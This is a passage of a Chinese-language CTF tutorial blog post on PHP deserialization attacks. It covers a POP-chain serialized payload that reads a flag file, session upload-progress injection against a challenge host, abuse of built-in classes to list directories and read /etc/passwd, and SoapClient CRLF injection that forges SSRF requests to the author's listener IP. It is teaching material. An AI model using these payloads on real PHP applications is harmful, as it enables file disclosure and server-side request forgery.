    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;daniu=<span class="hljs-string">&quot;I&#x27;m daniu.&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;robot=<span class="hljs-string">&quot;I&#x27;m robot.&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;notrobot=<span class="hljs-string">&quot;I&#x27;m not a robot.&quot;</span>;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$funName</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu.<span class="hljs-variable">$funName</span>.<span class="hljs-string">&quot;not exists!!!&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu;<br>            <span class="hljs-variable language_">$this</span>-&gt;daniu=<span class="hljs-variable language_">$this</span>-&gt;robot;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$robot</span>=<span class="hljs-variable language_">$this</span>-&gt;robot;<br>            <span class="hljs-variable language_">$this</span>-&gt;daniu-&gt;<span class="hljs-variable">$robot</span>=<span class="hljs-variable language_">$this</span>-&gt;notrobot;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;daniu;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu.<span class="hljs-variable">$key</span>.<span class="hljs-string">&quot;not exists!!!&quot;</span>;<br>        &#125;<br><br> &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Year</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$zodiac</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;happy &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;zodiac.<span class="hljs-string">&quot; year!&quot;</span>;<br><br>        &#125;<br>         <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;zodiac=<span class="hljs-string">&quot;Hu&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)#3</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;zodiac));<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;zodiac = <span class="hljs-string">&#x27;hu&#x27;</span>;<br>        &#125;<br><br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先构造pop链<br><code>O:5:&quot;Happy&quot;:1:&#123;s:5:&quot;happy&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:4:&quot;Year&quot;:1:&#123;s:6:&quot;zodiac&quot;;N;&#125;s:5:&quot;robot&quot;;s:6:&quot;zodiac&quot;;s:8:&quot;notrobot&quot;;s:5:&quot;/f1ag&quot;;&#125;s:5:&quot;robot&quot;;N;s:8:&quot;notrobot&quot;;N;&#125;&#125;</code></p><p>看下phpinfo中关于session的信息，可以知道当前index.php用的是<code>php</code>引擎，其他页面默认用<code>php_serialize</code>引擎，且<code>session.upload_progress.cleanup=Off</code>，意味着php不会立即清空对应的session文件，就不用进行条件竞争</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-4.png"></p><p>构造<code>POST</code>表单，提交传入序列化字符串</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://dece2f58-5f4b-4bd0-904a-ac58efcf9623.challenges.ctfer.com:8080/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;lewiserii&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>因为要放到<code>filename</code>中的双引号中，所以这里要转义一下双引号，在拼接上<code>|</code>，注意一定要带上<code>PHPSESSID</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-5.png"></p><blockquote><p>伪造PHP_SESSION_UPLOAD_PROGRESS的值时，值中一旦出现|，将会导致数据写入session文件失败，所以用filename</p></blockquote><h1 id="php原生类反序列化"><a href="#php原生类反序列化" class="headerlink" title="php原生类反序列化"></a>php原生类反序列化</h1><p>如果在代码审计中有反序列化点，但在代码中找不到pop链，可以利用php内置类来进行反序列化</p><h2 id="原生文件操作类"><a href="#原生文件操作类" class="headerlink" title="原生文件操作类"></a>原生文件操作类</h2><p><strong>可遍历目录类：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">DirectoryIterator</span> 类<br><span class="hljs-built_in">FilesystemIterator</span> 类<br><span class="hljs-built_in">GlobIterator</span> 类<br></code></pre></td></tr></table></figure><p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p><p>GlobIterator 类与前两个类的作用与使用方法相似，但与上面略不同的是其行为类似于glob()，可以通过模式匹配来寻找文件路径。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br><br><span class="hljs-comment">//也可以与glob://协议配合使用来查找文件</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*flag*&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;glob:///*flag*&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br><br><span class="hljs-comment">//GlobIterator无需借助glob协议即可搜索全局文件</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&quot;/*flag*&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br></code></pre></td></tr></table></figure><p><strong>可读取文件类</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">SplFileObject</span> 类<br></code></pre></td></tr></table></figure><p>SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//读取一个文件的一行</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;<br><br><span class="hljs-comment">//读取多行需要遍历或者使用伪协议</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;<br></code></pre></td></tr></table></figure><h2 id="SoapClient反序列化与ssrf"><a href="#SoapClient反序列化与ssrf" class="headerlink" title="SoapClient反序列化与ssrf"></a>SoapClient反序列化与ssrf</h2><p>首先需要了解什么是soap<br>soap，是webService三要素(SOAP、WSDL、UDDI)之一</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">SOAP: 基于HTTP协议，采用XML格式，用来描述传递信息的格式。<br><br>WSDL: 用来描述如何访问具体的服务。（相当于说明书）<br><br>UDDI: 用户自己可以按UDDI标准搭建UDDI服务器，用来管理，分发，查询WebService 。其他用户可以自己注册发布WebService调用。（现在基本废弃）<br></code></pre></td></tr></table></figure><p>简单来说就是soap是一种基于http的传输协议，可以发起请求来访问远程服务</p><p><a href="https://www.php.net/manual/zh/class.soapclient.php">php官方手册</a>中对soapclient的解释如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SoapClient</span> </span>&#123;<br><span class="hljs-comment">/* 属性 */</span><br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$uri</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$style</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$use</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$trace</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$compression</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$sdl</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$typemap</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$httpsocket</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$httpurl</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_login</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_password</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$_use_digest</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_digest</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_proxy_host</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$_proxy_port</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_proxy_login</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_proxy_password</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$_exceptions</span> = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_encoding</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">array</span> <span class="hljs-variable">$_classmap</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$_features</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$_connection_timeout</span>;<br><span class="hljs-keyword">private</span> ?resource <span class="hljs-variable">$_stream_context</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$_user_agent</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">bool</span> <span class="hljs-variable">$_keep_alive</span> = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$_ssl_method</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$_soap_version</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$_use_proxy</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$_cookies</span> = [];<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">array</span> <span class="hljs-variable">$__default_headers</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?SoapFault <span class="hljs-variable">$__soap_fault</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$__last_request</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$__last_response</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$__last_request_headers</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">private</span> ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$__last_response_headers</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-comment">/* 方法 */</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span>(?<span class="hljs-keyword">string</span> <span class="hljs-variable">$wsdl</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> = [])<br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span>): <span class="hljs-keyword">mixed</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__doRequest</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$request</span>,<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span>,<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$action</span>,<br>    <span class="hljs-keyword">int</span> <span class="hljs-variable">$version</span>,<br>    <span class="hljs-keyword">bool</span> <span class="hljs-variable">$oneWay</span> = <span class="hljs-literal">false</span><br>): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getCookies</span>(): <span class="hljs-keyword">array</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getFunctions</span>(): ?<span class="hljs-keyword">array</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastRequest</span>(): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastRequestHeaders</span>(): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastResponse</span>(): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getLastResponseHeaders</span>(): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__getTypes</span>(): ?<span class="hljs-keyword">array</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setCookie</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>, ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$value</span> = <span class="hljs-literal">null</span>): <span class="hljs-keyword">void</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setLocation</span>(?<span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> = <span class="hljs-literal">null</span>): ?<span class="hljs-keyword">string</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__setSoapHeaders</span>(SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$headers</span> = <span class="hljs-literal">null</span>): <span class="hljs-keyword">bool</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__soapCall</span>(<br>    <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>,<br>    <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span>,<br>    ?<span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> = <span class="hljs-literal">null</span>,<br>    SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$inputHeaders</span> = <span class="hljs-literal">null</span>,<br>    <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$outputHeaders</span> = <span class="hljs-literal">null</span><br>): <span class="hljs-keyword">mixed</span><br>&#125;<br></code></pre></td></tr></table></figure><p>先从手册中看soap的构造方法，可以看到有两个参数，第一个参数<code>$wsdl</code>用来指明是否为wsdl模式，第二个参数<code>$options</code>是一个数组。<br>当在第一个参数中指明了wsdl模式后，第二个参数是可选的，可以没有；当第一个参数设置为非wsdl模式后，第二个参数中必须设置uri和location选项。location就是目标url，uri是soap服务的命令空间</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-6.png"></p><p>再看__call()方法，当调用类中不存在的方法时就会触发，当触发这个方法后，它就会向location中的目标URL发送一个soap请求</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://20.2.129.79:7777&#x27;</span>));<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br></code></pre></td></tr></table></figure><p>在vps上监听对应的端口</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-7.png"></p><p>可以接收到一个post请求，并且<code>SOAPAction</code>的值明显是可控的，那么利用crlf我们就能控制数据包了</p><p>比如插入一个cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;aaa^^Cookie: test=123^^&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://20.2.129.79:7777&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$b</span>);<br><br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-8.png"></p><p>但是对于POST数据包，还存在一个问题，即Content-Type的值，默认是text&#x2F;xml，我们修改的SOAPAction在Content-Type的下面，无法控制Content-Type，也就不能控制POST的数据</p><p>在header里User-Agent在Content-Type前面，手册中也提到了如何设置User-Agent，我们可以在User-Agent中注入crlf，从而控制Content-Type的值</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-9.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$post_data</span> = <span class="hljs-string">&quot;data=abc&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;Mozilla/5.0^^Content-Type: application/x-www-form-urlencoded^^Content-Length: &#x27;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_data</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_data</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://20.2.129.79:7777&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$b</span>);<br><br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-comment">//echo urlencode($b);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>还需要在结尾设置一个Content-Length，一方面对于post包是必须的，另一方面还能让多余的数据丢弃，不影响我们设定的值</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-10.png"></p><p>这样就能实现soapclient+crlf组合拳攻击ssrf了</p><hr><p>参考文章:<br><a href="https://blog.csdn.net/mochu7777777/article/details/106909777">由浅入深理解PHP反序列化漏洞</a><br><a href="https://blog.csdn.net/solitudi/article/details/113588692">[CTF]PHP反序列化总结</a><br><a href="https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/">PHP-反序列化（超细的）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常见的魔术方法&quot;&gt;&lt;a href=&quot;#常见的魔术方法&quot; class=&quot;headerlink&quot; title=&quot;常见的魔术方法&quot;&gt;&lt;/a&gt;常见的魔术方法&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
      
    
    
    
